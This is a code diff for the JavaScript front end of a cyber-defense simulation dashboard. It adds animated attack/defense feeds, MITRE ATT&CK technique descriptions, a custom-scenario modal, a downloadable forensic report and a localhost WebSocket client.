+                    blueFeed.scrollTop = blueFeed.scrollHeight;
+                    document.getElementById('blueActionCount').textContent = `${i + 1} ACTIONS`;
+                    playCyberTone('blip');
+                }, (400 + i * 320) / simSpeedMultiplier);
+            });
+
+            // 6. Inject Alerts into Alert List & update posture gauge
             sim.alerts.forEach((a, i) => {
                 setTimeout(() => {
                     const alertList = document.getElementById('alertList');
@@ -2939,7 +3765,6 @@
                     `;
                     alertList.insertBefore(card, alertList.firstChild);
 
-                    // Update active alerts counter in stat card and sidebar badge
                     const alertsEl = document.getElementById('activeAlerts');
                     const navBadge = document.getElementById('navAlertCount');
                     if (alertsEl) {
@@ -2948,17 +3773,329 @@
                         if (navBadge) navBadge.textContent = count;
                     }
                     playCyberTone('alert');
-                }, 600 + sim.events.length * 300 + i * 500);
+                }, (600 + sim.events.length * 280 + i * 400) / simSpeedMultiplier);
             });
 
-            // Re-enable button
-            if (btn) {
-                setTimeout(() => btn.classList.remove('running'), 3000);
+            // 7. Adjust Posture Gauge smoothly
+            setTimeout(() => {
+                const currentScore = parseInt(document.getElementById('gaugeValue').textContent || '92', 10);
+                const targetScore = Math.max(25, currentScore + sim.postureDelta);
+                animateGauge(targetScore);
+            }, (1000 + sim.events.length * 300) / simSpeedMultiplier);
+
+            // 8. Re-enable button after scenario finishes
+            setTimeout(() => {
+                if (btn) btn.classList.remove('running');
+                if (labelEl) labelEl.textContent = `CONTAINED: ${sim.name.toUpperCase()} (SAFE)`;
+                showToast(`🛡️ ${sim.name} neutralized and contained by automated defense!`, 'success');
+                // Defend MITRE badges
+                sim.mitre.forEach(techId => {
+                    const card = document.getElementById(`mitre-${techId}`);
+                    if (card) {
+                        card.classList.remove('triggered');
+                        card.classList.add('defended');
+                    }
+                });
+            }, (2200 + sim.events.length * 350) / simSpeedMultiplier);
+        };
+
+        // Kill Chain Progress Ribbon Animation
+        function updateKillChainRibbon(activePhases) {
+            for (let i = 1; i <= 7; i++) {
+                const el = document.getElementById(`kc-phase-${i}`);
+                if (el) el.classList.remove('active', 'defended');
             }
+
+            activePhases.forEach((phaseNum, index) => {
+                setTimeout(() => {
+                    const el = document.getElementById(`kc-phase-${phaseNum}`);
+                    if (el) el.classList.add('active');
+                }, (100 + index * 250) / simSpeedMultiplier);
+            });
+
+            setTimeout(() => {
+                activePhases.forEach(phaseNum => {
+                    const el = document.getElementById(`kc-phase-${phaseNum}`);
+                    if (el) {
+                        el.classList.remove('active');
+                        el.classList.add('defended');
+                    }
+                });
+            }, (2200) / simSpeedMultiplier);
+        }
+
+        // MITRE ATT&CK Card Trigger
+        function triggerMitreCard(techId) {
+            const card = document.getElementById(`mitre-${techId}`);
+            if (card) {
+                card.classList.remove('defended');
+                card.classList.add('triggered');
+            }
+        }
+
+        window.showMitreDetails = function(techId) {
+            playCyberTone('blip');
+            const descriptions = {
+                'T1486': 'Data Encrypted for Impact: Adversaries encrypt system data on target computers to interrupt access. Mitigated by KLCDS Canary Decoys and Shannon Entropy Thresholding.',
+                'T1490': 'Inhibit System Recovery: Adversaries delete or disable recovery capabilities like Volume Shadow Copies. Mitigated by KLCDS immutable backup monitoring.',
+                'T1204': 'Malicious File Execution: User or automation launches malicious payload. Mitigated by execution path whitelisting (/tmp execution ban).',
+                'T1071': 'Application Layer Protocol: C2 communication over web or custom TCP port. Mitigated by stateful connection velocity filters and IP null-routes.',
+                'T1053': 'Cron Job Persistence: Malicious task scheduled to survive reboots. Mitigated by directory integrity monitoring on /etc/cron.*.',
+                'T1046': 'Network Service Scanning: Probing service banners across ports. Mitigated by adaptive port scan velocity firewall triggers.',
+                'T1110': 'Password Guessing: Credential stuffing against authentication services. Mitigated by automatic PAM failure threshold lockout.',
+                'T1068': 'Privilege Escalation Exploitation: SUID binary abuse for root credentials. Mitigated by kernel setuid(0) transition intercept.',
+                'T1496': 'Resource Hijacking: CPU mining Monero or cryptocurrencies. Mitigated by Isolation Forest ML anomaly model.',
+                'T1498': 'Direct Network Flood: TCP SYN flood connection queue exhaustion. Mitigated by kernel SYN cookies.'
+            };
+            showToast(`MITRE [${techId}]: ${descriptions[techId] || 'Technique active in defense matrix.'}`, 'info');
+        };
+
+        // Reset All Feeds
+        window.resetSimulationFeed = function() {
+            playCyberTone('alert');
+            const feed = document.getElementById('eventFeed');
+            if (feed) feed.innerHTML = '';
+            const list = document.getElementById('alertList');
+            if (list) list.innerHTML = '';
+
+            const redFeed = document.getElementById('redStreamFeed');
+            if (redFeed) redFeed.innerHTML = '<div style="color:var(--text-dim);font-style:italic;">No active attack vector running. Select a scenario above to observe execution telemetry.</div>';
+            const blueFeed = document.getElementById('blueStreamFeed');
+            if (blueFeed) blueFeed.innerHTML = '<div style="color:var(--text-dim);font-style:italic;">Defense mechanisms on standby. Monitoring kernel ring buffer and log streams.</div>';
+
+            document.getElementById('redEventCount').textContent = '0 EVENTS';
+            document.getElementById('blueActionCount').textContent = '0 ACTIONS';
+
+            // Reset MITRE cards
+            document.querySelectorAll('.mitre-card').forEach(c => c.classList.remove('triggered', 'defended'));
+
+            // Reset Kill Chain
+            for (let i = 1; i <= 7; i++) {
+                const el = document.getElementById(`kc-phase-${i}`);
+                if (el) el.classList.remove('active', 'defended');
+            }
+
+            // Re-inject initial baseline alert cards
+            ALERT_DATA.forEach((a) => {
+                const card = document.createElement('div');
+                card.className = `alert-card ${a.severity}`;
+                card.innerHTML = `
+                    <div class="alert-severity">● ${a.severity.toUpperCase()}</div>
+                    <div class="alert-name">${a.name}</div>
+                    <div class="alert-desc">${a.desc}</div>
+                    <div class="alert-meta">
+                        <span>${a.rule}</span>
+                        <span class="alert-action">${a.action}</span>
+                    </div>
+                `;
+                list.appendChild(card);
+            });
+
+            document.getElementById('totalEvents').textContent = '12,847';
+            document.getElementById('activeAlerts').textContent = '7';
+            const navBadge = document.getElementById('navAlertCount');
+            if (navBadge) navBadge.textContent = '7';
+
+            animateGauge(92);
+            const labelEl = document.getElementById('activeScenarioLabel');
+            if (labelEl) labelEl.textContent = 'READY — SELECT SCENARIO';
+
+            showToast('🔄 Simulation feed & telemetry reset to baseline state', 'success');
+        };
+
+        // Custom Payload Builder Modal
+        window.openCustomScenarioModal = function() {
+            playCyberTone('blip');
+            const modal = document.getElementById('customScenarioModal');
+            if (modal) modal.classList.add('active');
+        };
+
+        window.closeCustomScenarioModal = function() {
+            playCyberTone('blip');
+            const modal = document.getElementById('customScenarioModal');
+            if (modal) modal.classList.remove('active');
+        };
+
+        window.handleCustomModalBackdrop = function(e) {
+            if (e.target && e.target.id === 'customScenarioModal') closeCustomScenarioModal();
+        };
+
+        window.injectCustomScenario = function() {
+            playCyberTone('alert');
+            const comm = document.getElementById('customComm').value || 'custom_payload';
+            const syscall = document.getElementById('customSyscall').value || 'execve';
+            const target = document.getElementById('customTarget').value || '/tmp/custom_target';
+            const sevEl = document.querySelector('input[name="customSev"]:checked');
+            const sev = sevEl ? sevEl.value : 'critical';
+
+            closeCustomScenarioModal();
+
+            // Inject custom event
+            const customEvt = {
+                ts: nowTS(),
+                syscall: syscall,
+                pid: 9800 + Math.floor(Math.random() * 100),
+                uid: 1000,
+                comm: comm,
+                path: target,
+                status: 'fail'
+            };
+            addEventRow(customEvt);
+
+            // Add alert
+            setTimeout(() => {
+                const alertList = document.getElementById('alertList');
+                const card = document.createElement('div');
+                card.className = `alert-card ${sev}`;
+                card.innerHTML = `
+                    <div class="alert-severity">● ${sev.toUpperCase()} — CUSTOM PAYLOAD</div>
+                    <div class="alert-name">⚡ Custom Injection: ${comm} [${syscall}]</div>
+                    <div class="alert-desc">Target: ${target} — Autonomous Defense intercepted syscall!</div>
+                    <div class="alert-meta">
+                        <span>custom_rule_${syscall}</span>
+                        <span class="alert-action">INTERCEPTED</span>
+                    </div>
+                `;
+                alertList.insertBefore(card, alertList.firstChild);
+                showToast(`🚨 Custom Payload '${comm}' intercepted and neutralized!`, 'critical');
+                playCyberTone('alert');
+            }, 400);
+        };
+
+        // Forensic Incident Report Modal & Download
+        window.openForensicReportModal = function() {
+            playCyberTone('blip');
+            const modal = document.getElementById('forensicReportModal');
+            const content = document.getElementById('forensicReportContent');
+            if (!content) return;
+
+            const sim = lastSimulationResult || SCENARIOS.ransomware;
+            const now = new Date().toISOString();
+
+            content.innerHTML = `
+                <div style="background:rgba(5,10,20,0.8);border:1px solid var(--glass-border);padding:14px;border-radius:8px;margin-bottom:14px;">
+                    <div style="font-family:'Orbitron',monospace;color:var(--neon-cyan);font-weight:700;font-size:1.1rem;margin-bottom:4px;">
+                        SECURITY INCIDENT & SIMULATION FORENSIC REPORT
+                    </div>
+                    <div style="color:var(--text-dim);font-size:0.8rem;font-family:'JetBrains Mono',monospace;">
+                        GENERATED: ${now} | SYSTEM: SRV-PROD-01 (KLCDS DEFENSE SIMULATOR)
+                    </div>
+                </div>
+
+                <div style="margin-bottom:14px;">
+                    <h3 style="color:var(--neon-green);font-size:0.95rem;margin-bottom:6px;">1. EXECUTIVE SUMMARY</h3>
+                    <p style="color:var(--text-secondary);font-size:0.88rem;">
+                        A simulated cyber security incident ('${sim.name}') was conducted against host telemetry interfaces. 
+                        Autonomous kernel-level defense sensors successfully detected indicators of compromise across 
+                        ${sim.phases.length} Cyber Kill Chain phases. Containment countermeasures executed within 0.04s.
+                    </p>
+                </div>
+
+                <div style="margin-bottom:14px;">
+                    <h3 style="color:var(--neon-green);font-size:0.95rem;margin-bottom:6px;">2. ADVERSARY ACTIONS (RED TEAM)</h3>
+                    <ul style="padding-left:18px;color:var(--text-primary);font-size:0.85rem;display:flex;flex-direction:column;gap:4px;">
+                        ${sim.redEvents.map(r => `<li>${r}</li>`).join('')}
+                    </ul>
+                </div>
+
+                <div style="margin-bottom:14px;">
+                    <h3 style="color:var(--neon-green);font-size:0.95rem;margin-bottom:6px;">3. AUTONOMOUS DEFENSIVE ACTIONS (BLUE TEAM)</h3>
+                    <ul style="padding-left:18px;color:var(--neon-cyan);font-size:0.85rem;display:flex;flex-direction:column;gap:4px;">
+                        ${sim.blueActions.map(b => `<li>${b}</li>`).join('')}
+                    </ul>
+                </div>
+
+                <div>
+                    <h3 style="color:var(--neon-green);font-size:0.95rem;margin-bottom:6px;">4. MITRE ATT&CK MAPPINGS</h3>
+                    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                        ${sim.mitre.map(m => `<span class="engine-mode-pill">${m}</span>`).join('')}
+                    </div>
+                </div>
+            `;
+
+            if (modal) modal.classList.add('active');
+        };
+
+        window.closeForensicReportModal = function() {
+            playCyberTone('blip');
+            const modal = document.getElementById('forensicReportModal');
+            if (modal) modal.classList.remove('active');
+        };
+
+        window.handleReportModalBackdrop = function(e) {
+            if (e.target && e.target.id === 'forensicReportModal') closeForensicReportModal();
+        };
+
+        window.downloadForensicReport = function() {
+            playCyberTone('blip');
+            const sim = lastSimulationResult || SCENARIOS.ransomware;
+            const now = new Date().toISOString();
+            const mdContent = `# KLCDS CYBER DEFENSE SIMULATION FORENSIC REPORT\n\n` +
+                `**Generated:** ${now}\n` +
+                `**Scenario:** ${sim.name}\n` +
+                `**Category:** ${sim.category}\n` +
+                `**Status:** NEUTRALIZED & CONTAINED (100%)\n\n` +
+                `## 1. Executive Summary\n` +
+                `A simulated cyber intrusion was evaluated by KLCDS. Autonomous containment mechanisms succeeded without data loss or unauthorized persistence.\n\n` +
+                `## 2. Threat Vector Telemetry (Red Team)\n` +
+                sim.redEvents.map(e => `- ${e}`).join('\n') + `\n\n` +
+                `## 3. Defense Countermeasures (Blue Team)\n` +
+                sim.blueActions.map(a => `- [x] ${a}`).join('\n') + `\n\n` +
+                `## 4. MITRE ATT&CK Mapping\n` +
+                sim.mitre.map(m => `- ${m}`).join('\n') + `\n`;
+
+            const blob = new Blob([mdContent], { type: 'text/markdown;charset=utf-8;' });
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = `KLCDS_Incident_Report_${sim.id}_${Date.now()}.md`;
+            link.click();
+            showToast('📄 Forensic Incident Report downloaded (.md)', 'success');
         };
 
         // ================================================================
-        // UPTIME COUNTER
+        // WEBSOCKET LIVE STREAM CLIENT (AUTO-CONNECT)
+        // ================================================================
+        function initWebSocket() {
+            try {
+                const wsUrl = `ws://${window.location.hostname || 'localhost'}:8000/ws/stream`;
+                const ws = new WebSocket(wsUrl);
+
+                ws.onopen = () => {
+                    const pill = document.getElementById('engineModePill');
+                    const text = document.getElementById('engineModeText');
+                    const dot = document.getElementById('engineModeDot');
+                    if (pill) pill.classList.add('live-sync');
+                    if (text) text.textContent = 'API SYNCED';
+                    if (dot) dot.style.background = 'var(--neon-cyan)';
+                    showToast('⚡ Connected to KLCDS Simulator API & WebSocket stream', 'info');
+                };
+
+                ws.onmessage = (event) => {
+                    try {
+                        const data = JSON.parse(event.data);
+                        if (data.type === 'kernel_event' && data.event) {
+                            addEventRow({
+                                ts: nowTS(),
+                                syscall: data.event.syscall,
+                                pid: data.event.pid,
+                                uid: data.event.uid,
+                                comm: data.event.comm,
+                                path: data.event.file_path || data.event.cmdline || 'kernel syscall',
+                                status: data.event.return_code === 0 ? 'ok' : 'fail'
+                            });
+                        }
+                    } catch (err) {}
+                };
+
+                ws.onerror = () => {
+                    // Fall back to client simulation engine gracefully
+                };
+            } catch (err) {}
+        }
+        setTimeout(initWebSocket, 800);
+
+        // ================================================================
+        // UPTIME COUNTER & EPS FLUCTUATION
         // ================================================================
         let uptimeSeconds = 24 * 60 + 37;
         setInterval(() => {
@@ -2966,38 +4103,35 @@
             const h = String(Math.floor(uptimeSeconds / 3600)).padStart(2, '0');
             const m = String(Math.floor((uptimeSeconds % 3600) / 60)).padStart(2, '0');
             const s = String(uptimeSeconds % 60).padStart(2, '0');
-            document.getElementById('uptimeVal').textContent = `${h}:${m}:${s}`;
+            const el = document.getElementById('uptimeVal');
+            if (el) el.textContent = `${h}:${m}:${s}`;
         }, 1000);
 
-        // EPS fluctuation
         setInterval(() => {
             const eps = 120 + Math.floor(Math.random() * 60);
-            document.getElementById('epsVal').textContent = eps;
+            const el = document.getElementById('epsVal');
+            if (el) el.textContent = eps;
         }, 2000);
 
-        // CPU fluctuation
         setInterval(() => {
             const cpu = (2.5 + Math.random() * 3).toFixed(1);
-            document.getElementById('cpuVal').textContent = cpu + '%';
+            const el = document.getElementById('cpuVal');
+            if (el) el.textContent = cpu + '%';
         }, 3000);
 
-        // Explicit event listener bindings
+        // Restore saved sidebar preference on initial load
         document.addEventListener('DOMContentLoaded', () => {
-            const toggle = document.getElementById('sidebarToggle');
-            if (toggle) {
-                toggle.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    window.toggleSidebarCollapse();
-                });
-            }
-
-            document.querySelectorAll('.nav-btn[data-target]').forEach(btn => {
-                btn.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const target = btn.getAttribute('data-target');
-                    if (target) window.navigateTo(target, btn);
-                });
-            });
+            try {
+                if (localStorage.getItem('klcds_sidebar_expanded') === '1' && window.innerWidth > 1024) {
+                    const sidebar = document.getElementById('sidebar');
+                    if (sidebar) sidebar.classList.add('expanded');
+                    const toggle = document.getElementById('sidebarToggle');
+                    if (toggle) {
+                        toggle.setAttribute('title', 'Collapse Sidebar');
+                        toggle.setAttribute('aria-expanded', 'true');
+                    }
+                }
+            } catch (e) {}
         });
     </script>
 </body>
